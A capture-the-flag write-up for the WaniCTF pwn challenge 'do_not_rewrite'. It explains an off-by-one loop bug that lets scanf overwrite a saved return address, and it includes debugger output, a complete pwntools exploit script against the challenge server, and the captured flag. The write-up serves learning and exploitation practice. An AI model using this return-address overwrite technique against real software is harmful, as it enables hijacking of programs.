https://ctftime.org/event/2377

# do_not_rewrite (pwn)

canaryにはかなーり気をつけないといけません

Be careful with the canary.

nc chal-lz56g6.wanictf.org 9004

## Analysis

We are given the address of `show_flag`. We can use this to compute the aslr base for the image.

We can see in the provided c code an off-by-one error:

```c
Ingredient ingredients[3];
    printf("hint: show_flag = %p\n", (void *)show_flag);

    for (int i = 0; i <= 3; i++) {
```

This means that the calls to `scanf` on the fourth loop will likely write to the regions of the stack containing the canary and the return address.

We can see that when attempting to read the name of the fourth ingredient that scanf will write to a return address on the stack:

```
0x56fba68b43c8 <main+171>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
        format: 0x56fba68b505b ◂— 0x746e450000007325 /* '%s' */
        vararg: 0x7ffc6c0c29e8 —▸ 0x7c08d202a1ca (__libc_start_call_main+122) ◂— mov edi, eax
```

We can see the current return addresses like this:

```
pwndbg> retaddr
0x7ffc6c0c29e8 —▸ 0x7c08d202a1ca (__libc_start_call_main+122) ◂— mov edi, eax
0x7ffc6c0c2a88 —▸ 0x7c08d202a28b (__libc_start_main+139) ◂— mov r15, qword ptr [rip + 0x1d8cf6]
0x7ffc6c0c2ae8 —▸ 0x56fba68b4145 (_start+37) ◂— hlt 
```

Therefore we can simply write the address of `show_flag` here to jump there by providing this value instead of a name.

However, there is one minor adjustment to make. We cannot simply jump to the first instruction of the function instead the address if offset by `0x17` to be just before the `call` to `system`.

Lastly in order to prevent the other two calls to `scanf` from disturing the stack we supply a non-numerical value.

## Solution

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall", checksec=False)
context.binary = elf

p = remote("chal-lz56g6.wanictf.org", 9004)

p.readuntil(b"hint: show_flag = ")
leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["show_flag"]
log.info(f"elf: 0x{elf.address:x}")

for i in range(3):
    p.sendlineafter(b": ", b"A")
    p.sendlineafter(b": ", b"1.1")
    p.sendlineafter(b": ", b"1.1")

p.sendlineafter(b": ", p64(elf.sym["show_flag"]+0x17))
p.sendlineafter(b": ", b"abc")
p.sendlineafter(b": ", b"efg")

p.interactive()
```

## Flag
`FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}`

smiley 2024/06/22
